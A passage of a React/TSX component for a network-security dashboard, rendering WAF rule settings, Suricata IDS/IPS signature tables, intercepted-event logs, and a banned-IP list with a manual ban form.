                              rule.action === 'CHALLENGE' ? 'bg-amber-100 text-amber-900 border-amber-300 dark:bg-amber-950 dark:text-amber-200' :
                              'bg-indigo-100 text-indigo-900 border-indigo-300 dark:bg-indigo-950 dark:text-indigo-200'
                            } focus:outline-none cursor-pointer`}
                          >
                            <option value="BLOCK">BLOCK (403)</option>
                            <option value="CHALLENGE">CHALLENGE (CAPTCHA)</option>
                            <option value="LOG">LOG ONLY</option>
                          </select>
                        </td>

                        <td className="p-3 text-right font-mono font-bold text-slate-700 dark:text-slate-300">
                          {rule.matches24h.toLocaleString()}
                        </td>
                      </tr>
                    ))}
                  </tbody>
                </table>
              </div>
            </div>
          )}

          {/* TAB 2: IDS / IPS SURICATA SENSORS */}
          {activeTab === 'ids_ips' && (
            <div className="space-y-3">
              <div className="p-3 rounded-lg border bg-indigo-50/50 dark:bg-indigo-950/20 border-indigo-200 dark:border-indigo-900/40 text-xs flex items-center justify-between">
                <div className="flex items-center gap-2">
                  <Cpu className="w-4 h-4 text-indigo-600 dark:text-indigo-400" />
                  <span className="font-bold text-indigo-900 dark:text-indigo-200">Suricata 7.0 eBPF XDP Packet Inspection Engine</span>
                  <span className="text-slate-500 text-[11px]">| Zero-copy kernel space packet filtering enabled</span>
                </div>
                <span className="font-mono text-[10px] font-bold text-emerald-600 dark:text-emerald-400 bg-emerald-100 dark:bg-emerald-950 px-2 py-0.5 rounded border border-emerald-300">
                  KERNEL BYPASS ACTIVE
                </span>
              </div>

              <div className="overflow-x-auto border rounded-xl border-slate-200 dark:border-slate-800">
                <table className="w-full text-left border-collapse">
                  <thead>
                    <tr className={`text-[11px] font-bold uppercase tracking-wider border-b ${
                      isLight ? 'bg-slate-100 text-slate-600 border-slate-200' : 'bg-slate-900 text-slate-400 border-slate-800'
                    }`}>
                      <th className="p-3 font-mono">SID</th>
                      <th className="p-3">Signature Title & Description</th>
                      <th className="p-3">Protocol</th>
                      <th className="p-3">Category</th>
                      <th className="p-3">Enforcement Mode</th>
                      <th className="p-3 text-right">24h Drops</th>
                    </tr>
                  </thead>
                  <tbody className="divide-y divide-slate-200 dark:divide-slate-800 text-xs">
                    {idsSignatures.map((sig) => (
                      <tr key={sig.id} className={`transition-colors ${isLight ? 'hover:bg-slate-50' : 'hover:bg-slate-900/60'}`}>
                        <td className="p-3 font-mono font-bold text-purple-600 dark:text-purple-400">
                          [{sig.sid}]
                        </td>

                        <td className="p-3">
                          <div className={`font-bold ${isLight ? 'text-slate-900' : 'text-slate-100'}`}>
                            {sig.name}
                          </div>
                          <div className={`text-[11px] ${isLight ? 'text-slate-600' : 'text-slate-400'}`}>
                            {sig.description}
                          </div>
                        </td>

                        <td className="p-3 font-mono text-[11px]">
                          <span className="px-2 py-0.5 rounded bg-slate-100 dark:bg-slate-800 text-slate-700 dark:text-slate-300 border border-slate-200 dark:border-slate-700">
                            {sig.protocol}
                          </span>
                        </td>

                        <td className="p-3 font-mono text-[10px] font-bold">
                          <span className={`px-2 py-0.5 rounded ${
                            sig.category === 'EXPLOIT' ? 'bg-rose-100 text-rose-800 border border-rose-300' :
                            sig.category === 'C2_BEACON' ? 'bg-purple-100 text-purple-800 border border-purple-300' :
                            'bg-amber-100 text-amber-800 border border-amber-300'
                          }`}>
                            {sig.category}
                          </span>
                        </td>

                        <td className="p-3">
                          <button
                            onClick={() => handleToggleSignatureMode(sig.id)}
                            className={`px-3 py-1 rounded-lg text-xs font-bold transition-all cursor-pointer border ${
                              sig.mode === 'IPS_BLOCK'
                                ? 'bg-rose-600 text-white border-rose-600'
                                : 'bg-amber-600 text-white border-amber-600'
                            }`}
                          >
                            {sig.mode === 'IPS_BLOCK' ? 'IPS Auto-Drop' : 'IDS Alert Only'}
                          </button>
                        </td>

                        <td className="p-3 text-right font-mono font-bold text-slate-700 dark:text-slate-300">
                          {sig.triggered24h.toLocaleString()}
                        </td>
                      </tr>
                    ))}
                  </tbody>
                </table>
              </div>
            </div>
          )}

          {/* TAB 3: LIVE INTERCEPTION LOGS */}
          {activeTab === 'logs' && (
            <div className="space-y-3">
              <div className="space-y-2 max-h-[600px] overflow-y-auto pr-1">
                {eventLogs.map((log) => (
                  <div
                    key={log.id}
                    className={`p-3.5 rounded-xl border space-y-2 transition-all ${
                      isLight ? 'bg-slate-50/80 border-slate-200 hover:border-slate-300' : 'bg-slate-900 border-slate-800 hover:border-slate-700'
                    }`}
                  >
                    <div className="flex flex-wrap items-center justify-between gap-2">
                      <div className="flex items-center gap-2">
                        <span className={`px-2 py-0.5 rounded text-[10px] font-mono font-bold ${
                          log.engine === 'WAF' ? 'bg-rose-500/20 text-rose-700 dark:text-rose-300 border border-rose-500/30' : 'bg-indigo-500/20 text-indigo-700 dark:text-indigo-300 border border-indigo-500/30'
                        }`}>
                          {log.engine} Engine
                        </span>

                        <span className="font-mono text-xs font-bold text-indigo-600 dark:text-indigo-400">
                          [{log.ruleMatched}]
                        </span>

                        <span className={`text-xs font-bold ${isLight ? 'text-slate-900' : 'text-slate-100'}`}>
                          {log.attackType}
                        </span>
                      </div>

                      <div className="flex items-center gap-2">
                        <span className="text-[10px] font-mono text-slate-400">
                          {log.timestamp}
                        </span>

                        <span className={`px-2 py-0.5 rounded text-[10px] font-bold ${
                          log.actionTaken === 'BLOCKED_403' || log.actionTaken === 'PACKET_DROPPED'
                            ? 'bg-rose-100 text-rose-800 dark:bg-rose-950 dark:text-rose-300 border border-rose-300'
                            : 'bg-amber-100 text-amber-800 dark:bg-amber-950 dark:text-amber-300 border border-amber-300'
                        }`}>
                          {log.actionTaken}
                        </span>
                      </div>
                    </div>

                    <div className="grid grid-cols-1 md:grid-cols-2 gap-2 text-xs font-mono">
                      <div className={`p-2 rounded border ${isLight ? 'bg-white border-slate-200' : 'bg-slate-900 border-slate-800'}`}>
                        <span className="text-[10px] uppercase text-slate-400 block font-bold">Source IP & Location:</span>
                        <span className="font-bold text-indigo-600 dark:text-indigo-400">{log.sourceIp}</span> ({log.location})
                      </div>

                      <div className={`p-2 rounded border ${isLight ? 'bg-white border-slate-200' : 'bg-slate-900 border-slate-800'}`}>
                        <span className="text-[10px] uppercase text-slate-400 block font-bold">Target URI / Vector:</span>
                        <span className="truncate block font-bold text-slate-800 dark:text-slate-200">{log.targetUri}</span>
                      </div>
                    </div>

                    {/* Payload Inspection */}
                    <div className={`p-2 rounded border font-mono text-xs ${isLight ? 'bg-slate-200/60 border-slate-300 text-slate-800' : 'bg-slate-900/90 border-slate-800 text-rose-300'}`}>
                      <span className="text-[10px] text-slate-400 font-bold block mb-0.5">Intercepted Payload:</span>
                      <code>{log.payloadSnippet}</code>
                    </div>
                  </div>
                ))}
              </div>
            </div>
          )}

          {/* TAB 4: DYNAMIC BANNED IPS */}
          {activeTab === 'ban_list' && (
            <div className="space-y-3">
              <div className="overflow-x-auto border rounded-xl border-slate-200 dark:border-slate-800">
                <table className="w-full text-left border-collapse">
                  <thead>
                    <tr className={`text-[11px] font-bold uppercase tracking-wider border-b ${
                      isLight ? 'bg-slate-100 text-slate-600 border-slate-200' : 'bg-slate-900 text-slate-400 border-slate-800'
                    }`}>
                      <th className="p-3 font-mono">IP Address</th>
                      <th className="p-3">Location</th>
                      <th className="p-3">Trigger Reason</th>
                      <th className="p-3">Banned At</th>
                      <th className="p-3">TTL Remaining</th>
                      <th className="p-3 text-right font-mono">Threat Score</th>
                      <th className="p-3 text-right">Action</th>
                    </tr>
                  </thead>
                  <tbody className="divide-y divide-slate-200 dark:divide-slate-800 text-xs font-mono">
                    {blockedIps.map((ip) => (
                      <tr key={ip.id} className={`transition-colors ${isLight ? 'hover:bg-slate-50' : 'hover:bg-slate-900/60'}`}>
                        <td className="p-3 font-bold text-rose-600 dark:text-rose-400 flex items-center gap-2">
                          <Ban className="w-3.5 h-3.5" />
                          <span>{ip.ipAddress}</span>
                        </td>

                        <td className="p-3 text-slate-600 dark:text-slate-300 font-sans">
                          {ip.country}
                        </td>

                        <td className="p-3 font-sans font-medium text-slate-800 dark:text-slate-200">
                          {ip.reason}
                        </td>

                        <td className="p-3 text-slate-500">
                          {ip.bannedAt}
                        </td>

                        <td className="p-3 font-bold text-amber-600 dark:text-amber-400">
                          {ip.ttlRemaining}
                        </td>

                        <td className="p-3 text-right font-bold text-rose-600">
                          {ip.threatScore}/100
                        </td>

                        <td className="p-3 text-right">
                          <button
                            onClick={() => handleUnbanIp(ip.id)}
                            className="px-2.5 py-1 rounded bg-slate-200 dark:bg-slate-800 hover:bg-slate-300 dark:hover:bg-slate-700 text-slate-700 dark:text-slate-200 font-sans font-bold text-xs cursor-pointer transition-colors"
                          >
                            Unban IP
                          </button>
                        </td>
                      </tr>
                    ))}
                  </tbody>
                </table>
              </div>
            </div>
          )}
        </div>
      </div>

      {/* Manual IP Ban Modal */}
      {showBanModal && (
        <div className="fixed inset-0 bg-slate-900/70 backdrop-blur-xs flex items-center justify-center p-4 z-50">
          <div className={`p-5 rounded-2xl border max-w-md w-full space-y-4 shadow-xl ${
            isLight ? 'bg-white border-slate-200 text-slate-900' : 'bg-slate-900 border-slate-800 text-white'
          }`}>
            <div className="flex items-center justify-between border-b pb-3 border-slate-200 dark:border-slate-800">
              <h3 className="text-sm font-bold flex items-center gap-2">
                <Ban className="w-4 h-4 text-amber-500" />
                <span>Add IP / CIDR to Firewall Blocklist</span>
              </h3>
              <button
                onClick={() => setShowBanModal(false)}
                className="text-slate-400 hover:text-slate-600 text-xs font-bold"
              >
                ✕
              </button>
            </div>

            <div className="space-y-3 text-xs">
              <div>
                <label className="block font-bold mb-1">Target IP Address or Subnet (CIDR):</label>
                <input
                  type="text"
                  placeholder="e.g. 198.51.100.45 or 198.51.100.0/24"
                  value={newBanIp}
                  onChange={(e) => setNewBanIp(e.target.value)}
                  className={`w-full p-2.5 rounded-lg border font-mono ${
                    isLight ? 'bg-slate-50 border-slate-300' : 'bg-slate-900 border-slate-800'
                  } focus:outline-none`}
                />
              </div>

              <div>
                <label className="block font-bold mb-1">Ban Reason / Ticket Ref:</label>
                <input
                  type="text"
                  placeholder="e.g. Malicious scanner / SOC Incident #892"
                  value={newBanReason}
                  onChange={(e) => setNewBanReason(e.target.value)}
                  className={`w-full p-2.5 rounded-lg border ${
                    isLight ? 'bg-slate-50 border-slate-300' : 'bg-slate-900 border-slate-800'
                  } focus:outline-none`}
                />
              </div>
            </div>

            <div className="flex items-center justify-end gap-2 pt-2 border-t border-slate-200 dark:border-slate-800">
              <button
                onClick={() => setShowBanModal(false)}
                className="px-4 py-2 rounded-lg text-xs font-bold text-slate-600 dark:text-slate-400 hover:bg-slate-100 dark:hover:bg-slate-800"
              >
                Cancel
              </button>
              <button
                onClick={handleAddBanIp}
                className="px-4 py-2 rounded-lg text-xs font-bold bg-amber-600 hover:bg-amber-500 text-white shadow-2xs"
              >
                Add Firewall Ban
              </button>
            </div>
          </div>
        </div>
      )}
    </div>
  );
}
